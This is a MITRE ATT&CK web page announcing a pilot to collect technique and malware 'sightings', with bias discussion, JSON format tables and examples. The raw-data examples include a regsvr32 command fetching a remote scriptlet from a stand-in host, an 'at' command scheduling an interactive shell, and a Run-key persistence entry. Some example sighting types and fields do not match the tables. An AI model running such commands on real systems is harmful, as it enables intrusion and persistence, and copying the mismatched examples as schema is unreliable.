Title: ATT&CK Sightings
Template: general/intro-overview
Date: 2019
Category: Cyber Threat Intelligence
Authors: Blake Strom
url: /resources/sightings
save_as: resources/sightings/index.html

*The ATT&CK Team believes that we can best equip teams to defend against adversaries by collecting and reporting sightings of techniques to the entire community, so we're conducting a pilot to solicit that data. You can share to help make the whole community better!*

## Background

Though the open-source reporting that is integrated into ATT&CK provides important information about which techniques are used by which adversaries, it is subject to various biases:

* **Novelty bias**: new and interesting techniques or existing techniques used by new actors get reported, while run of the mill techniques used over and over again do not.
* **Visibility bias**: organizations publishing intel reports have visibility of certain techniques and not others. For incident responders, responding to a fire in progress vice sifting through the ashes to find out what happened will give a different view as well. Not all techniques can be viewed the same way during or after an incident.
* **Producer bias**: some organizations publish much more reporting, and the types of customers or visibility they have may not reflect the broader industry/world.
* **Victim bias**: certain types of victim organizations may be more likely to report (or be reported on) than others.
* **Availability bias**: techniques that are easily called to mind are likely reported more frequently, as report authors think to include them more often.

This doesn't mean that information contained in threat reports is useless -- obviously, it's very useful towards telling us what's being used, by who, and how. It’s the entire foundation of the ATT&CK knowledge base. But, what it does mean is that using it as raw data to understand the prevalence of techniques or how they’re leveraged over time and across industries might give deceiving answers. This can be particularly important if you’re prioritizing defensive operations – you want to focus defenses on techniques that are used more often by more adversaries, not  just those that are new and interesting or come to mind more easily.

To help counter this and extend ATT&CK’s foundation as a data-driven knowledge base, the team will begin soliciting contributions of raw *sightings* of ATT&CK techniques. We hope that this data will help us make the ATT&CK knowledge base itself better as well as make it easier for consumers to understand how techniques are used.
<br><br>
## Types of Sightings

ATT&CK sightings data collection will take three forms, each of which provides a different insight into the usage of techniques.

#### Direct sighting of a technique

The ATT&CK team is most interested in data from actual sightings of techniques being executed in the course of an attack. In other words, during an event investigation data is collected which shows that one or more ATT&CK techniques were actually used by the adversary on (or targeted at) the victim infrastructure. Cases where multiple techniques were detected as part of a single attack should be reported as a single sighting with multiple techniques listed.

**Example**: If mimikatz were used on a victim machine to dump credentials and that was observed by an EDR tool, it would constitute a direct sighting of Credential Dumping. This might take the form of a sighting of a process accessing lsass.exe memory, for example.

Direct sightings of techniques are the most valuable type of sighting because they tell you, at a ground-truth level, that the adversary relied on a specific technique to carry out an attack.

Direct technique sightings are reported using the [direct-technique-sighting](#direct-technique-sighting) format.

#### Direct sighting of malicious software

In some cases, a technique might not be directly observed (or even be observable given sensing capability) but the presence of a piece of malicious software on the machine can give a strong hint that it was used. In other cases, software to carry out a technique might be blocked at the perimeter – in those cases, it indicates that the adversary might have wanted to use a certain technique but wasn't able to.

*Note: There is of course a grey area when talking about malicious software. What we mean is tools that can be used to carry out malicious attacks, including things commonly called "penetration test" software as well as those that are clearly malicious. On the other hand, we don't mean built-in OS functionality. So please **do** send us sightings of things like metasploit or cobalt strike, but **do not** send us sightings of powershell or the net command. Those latter items should be reported as a direct sighting of a technique (e.g., T1086).*

**Example**: The presence of mimikatz.exe on a machine without evidence that it was actually run to dump credentials – or, mimikatz.exe being blocked at the perimeter or by antimalware -- would constitute a direct sighting of mimikatz. From that, you can assume some attempt to perform credential access techniques available in mimikatz -- but because they were not directly observed, you can't be certain exactly what did or could have happened.

Note that direct software sightings are most useful for [software already contained in ATT&CK](https://attack.mitre.org/software/) that directly enables one or more ATT&CK techniques.

Direct software sightings are reported using the [direct-software-sighting](#direct-software-sighting) format.

#### Indirect sightings of malicious software

In other cases, threat intelligence platforms or ISACs might have data feeds that indirectly demonstrate the fact that a piece of software is being used, without directly observing it.

**Example**: A file hash for mimikatz.exe shared to an ISAC or threat intel platform would be an indirect sighting of mimikatz.exe. As with a direct sighting of malware, this does provide some indication (though weaker) that an adversary was interested in performing credential access.

Note that, as above, indirect software sightings are most useful for [software already contained in ATT&CK](https://attack.mitre.org/software/) that directly enables one or more ATT&CK techniques. Additionally, indirect sightings should only be reported when there is a reasonable presumption that they haven't been reported by another party. In other words, don't write a scraper for some TIP and send sightings for all IOCs in that TIP unless you own or operate the TIP (if you do, please send us the sightings!).

Indirect software sightings are reported using the [indirect-software-sighting](#indirect-software-sighting) format.
<br><br>
## Data Usage

In general, the ATT&CK team believes that richer data collection of more raw data will allow us to better understand how techniques are used in practice. You could ask questions like:

* Which techniques are used more often?
* Do the techniques used differ by sector?
* Do the techniques used differ by actor type (APT vs. FIN)?
* How does usage change over time?

Though the eventual goal of this program is to provide useful data to the community, in order to tread carefully, at this initial piloting stage we would keep the data internal to the MITRE ATT&CK team and would protect it by an NDA. The goals of this would be to:

* Prove the concept works and that quality data can be collected
* Understand the differences between the types of data that are contributed, and how they can still be aggregated to provide a consistent picture
* Work with submitters to identify how they want data to eventually be published (i.e., how it’s attributed, how data from different submitters is combined, how much it has to be aggregated, etc.)
* Iron out any kinks in the collection process (our data format, etc.)

After those initial steps are completed (we expect a few months, but it could be longer) and the participants can agree on how they want the data published we’ll begin initial operations. At that phase, we’ll continue to work closely with all submitters to ensure that we get the data we’re expecting. Over time, we can transition to more automated collection and processing.

Note that this is not an operational threat sharing mechanism and we do not intend to ever directly share even anonymized raw sightings data.

<center><img src="/theme/images/sightings-lifecycle.png" alt="pilot to initial ops to mature ops flow" /></center>
<br><br>
## Contribute
Have data that fits into one of these buckets? Contact us at <attack@mitre.org> to get started! In particular we hope that EDR vendors, intel reporters, TIP vendors, ISACs, and end user organizations can help the community by providing this data. The format description below is meant to get you started -- if you have any questions simply get in touch.

We'd also love to hear from you if you would you find data like this useful or have ideas on how we can publish it to make it useful.
<br><br>
## Format Definitions

All formats are JSON and consist of either a list of entries or a single entry. Please e-mail <attack@mitre.org> with any questions or suggestions.

Fields in **bold** are required, all other fields are optional. For the "Timestamp" datatype, please use RFC 3339 timestamps in UTC time. Most importantly, please do not include any information beyond that specified in the format below. In particular, we do not want to collect sensitive victim information or other PII.

#### <a class="anchor" name="direct-technique-sighting"></a>direct-technique-sighting

|Field                                             |Datatype                                        |Description
|--------------------------------------------------|------------------------------------------------|----------|
|**id***                                           |String                                          |A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.
|**sightingType***                                 |String                                          |**MUST** be "direct-technique-sighting" to indicate that this is a direct technique sighting.
|**startTime***                                    |Timestamp                                       |The time the activity started.
|**endTime***                                      |Timestamp                                       |The time the activity ended.
|**detectionType***                                |String                                          |One of "human-validated" or "raw". Use validated when a human analyst has reviewed the detection and determined it to not be a false positive.
|**techniques***                                   |List[[Technique](#technique)]   |The list of techniques that were observed (see technique table below).
|sectors                                           |List\[String\]                                  |A list of sectors that the victim belongs to.
|country                                           |String                                          |The ISO country code of the victim.
|size                                              |String                                          |The approximate size (in number of employees) of the victim.
|attributionType                                   |String                                          |Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.
|attribution                                       |String                                          |The name of the threat group, incident/campaign, or malicious software associated to this activity. This should ideally be an exact name from the list of [Group Names or Associated Groups](https://attack.mitre.org/groups/) already in ATT&CK for threat groups, and of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK for malicious software.

<br>
#### <a class="anchor" name="direct-software-sighting"></a>direct-software-sighting

|Field                                             |Datatype                                        |Description
|--------------------------------------------------|------------------------------------------------|----------|
|**id***                                           |String                                          |A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.
|**sightingType***                                 |String                                          |**MUST** be "direct-software-sighting" to indicate that this is a direct software sighting.
|**startTime***                                    |Timestamp                                       |The time the activity started.
|**endTime***                                      |Timestamp                                       |The time the activity ended.
|**detectionType***                                |String                                          |One of "human-validated" or "raw". Use validated when a human analyst has reviewed the detection and determined it to not be a false positive.
|**software***                                     |String                                          |The malicious software that was observed. This should ideally be an exact name from the list of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK.
|**techniques***                                   |List[[Technique](#technique)]   |The list of techniques that are associated with this malware.
|sectors                                           |List\[String\]                                  |A list of sectors that the victim belongs to.
|country                                           |String                                          |The ISO country code of the victim.
|size                                              |String                                          |The approximate size (in number of employees) of the victim.
|attributionType                                   |String                                          |Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.
|attribution                                       |String                                          |The name of the threat group or incident/campaign associated to this malware. This should ideally be an exact name from the list of [Group Names or Associated Groups](https://attack.mitre.org/groups/) already in ATT&CK for threat groups.

<br>
#### <a class="anchor" name="indirect-software-sighting"></a>indirect-software-sighting

|Field                                             |Datatype                                        |Description
|--------------------------------------------------|------------------------------------------------|----------|
|**id***                                           |String                                          |A required ID for this event. Can be any format, but if you don\'t have a preference UUIDv4 is preferred to ensure uniqueness.
|**sightingType***                                 |String                                          |**MUST** be "indirect-software-sighting" to indicate that this is an indirect software sighting.
|**time***                                    |Timestamp                                       |The time the indicator was seen.
|**software***                                     |String                                          |The malicious software that was observed. This should ideally be an exact name from the list of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK.
|**ioc***                                          |String                                          |The IOC (e.g., hash) that was seen. This is only used for de-duplication, please do not use this as an IOC submission mechanism.
|**techniques***                                   |List[[Technique](#technique)]   |The list of techniques that are associated with this malware.
|sectors                                           |List\[String\]                                  |A list of sectors that the victim belongs to.
|country                                           |String                                          |The ISO country code of the victim.
|size                                              |String                                          |The approximate size (in number of employees) of the victim.
|attributionType                                   |String                                          |Either "group", "incident", \"software\". Omit this field and the attribution field if attribution is unknown or not sharable.
|attribution                                       |String                                          |The name of the threat group, incident/campaign, or software associated to this activity. This should ideally be an exact name from the list of [Group Names or Associated Groups](https://attack.mitre.org/groups/) already in ATT&CK for threat groups, and of [Software Names or Associated Software](https://attack.mitre.org/software/) already in ATT&CK for malicious software.
|  techniques                                      |List[[Technique](#technique)]    |The list of techniques that were observed (see technique table below). This is **required** for software not already in ATT&CK.

<br>
#### <a class="anchor" name="technique"></a>technique

| Field                 | Datatype              | Description           |
|-----------------------|-----------------------|-----------------------|
|**techniqueID***       | String                | The ATT&CK ID (e.g., "T1086") that was observed.
| platform              | String                | The platform this technique was observed on. Please include the full name, edition, and version. E.g., "Windows 10 Enterprise", "Windows Server 2012 Standard", "MacOS 10.13.5", "Ubuntu 14.04".
| startTime             | Timestamp             | The time that this specific technique was observed.
| endTime               | Timestamp             | The time that this specific technique sighting ended.
| tactic                | String                | The name of the tactic that this technique was used to enable. For example, a sighting of Scheduled Task could indicate whether it was used for privilege escalation or for persistence. Format should be the technique name as referenced in ATT&CK navigator layer file format (lowercase dashed, credential-access).
| rawData               | List\[data\]          | The list of raw data, if sharable, to support this observation. Could be command lines, event records, etc. Format this as described below.|

<br>
##### Formatting raw data

Each object in the list of raw data should consist of an object from the [CAR data model](https://car.mitre.org/data_model/) in the form "object.action": {"field": "value"}.

For example:

**Command Line**:
```
"process.create": {"command_line": "regsvr32.exe /i:hxxp://lolbad.com scrobj.dll"}
```

**Registry Key**:
```
"registry.add": {
    "hive": "HKEY_CURRENT_USER",
    "key": "\Software\Microsoft\Windows\CurrentVersion\Run",
    "value": "bad.exe"
}
```

More complete examples are also below. If something isn't expressible in the CAR data model as-is, just make up and object and action that makes sense to you and we'll figure it out.
<br><br>
## Examples

#### Simple Technique Sighting
A managed service provider monitors sensor data across its customer base. During that monitoring, an analytic flags a Sysmon process event that indicates a scheduled task is being created using "at".

```
{
  "id": "DT-1234",
  "sightingType": "direct-technique-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "human-validated",
  "techniques": [
    {
      "techniqueID": "T1088",
      "startTime": "2019-01-01T08:12:00Z",
      "endTime": "2019-01-01T08:12:00Z",
      "platform": "Windows 10",
      "rawData": [
        "process.create": {"command_line": "at 13:30 /interactive cmd"}
      ]
    }
  ]
}
```

#### Technique Sighting with Attribution
An ISAC collects, anonymizes, and redistributes sightings from its members. While it doesn’t receive the raw data, it does have demographic and (sometimes) attribution information.

```
{
  "id": "1000",
  "sightingType": "direct-technique-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "human-validated",
  "sectors": ["finance"],
  "attributionType": "group",
  "attribution": "FIN7",
  "techniques": [
    {
      "techniqueID": "T1003",
      "startTime": "2019-01-01T08:12:00Z",
      "endTime": "2019-01-01T08:12:00Z",
      "platform": "Windows 10 Enterprise"
    }
  ]
}
```

#### Malware Blocked by Security Tool
A large end-user organization is running an anti-malware service that blocks execution of a Mac malware already in ATT&CK.

```
{
  "id": "32",
  "sightingType": "direct-malware-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "detectionType": "raw",
  "sectors": ["healthcare"],
  "software": "MacSpy"
}
```

#### IOC Submission
A TIP vendor submits a set of IOCs that have been identified with ATT&CK techniques.

```
{
  "id": "32",
  "sightingType": "indirect-malware-sighting",
  "startTime": "2019-01-01T08:12:00Z",
  "endTime": "2019-01-01T08:12:00Z",
  "sectors": ["healthcare"],
  "software": "RemCom",
  "ioc": "<some hash>"
} 
```
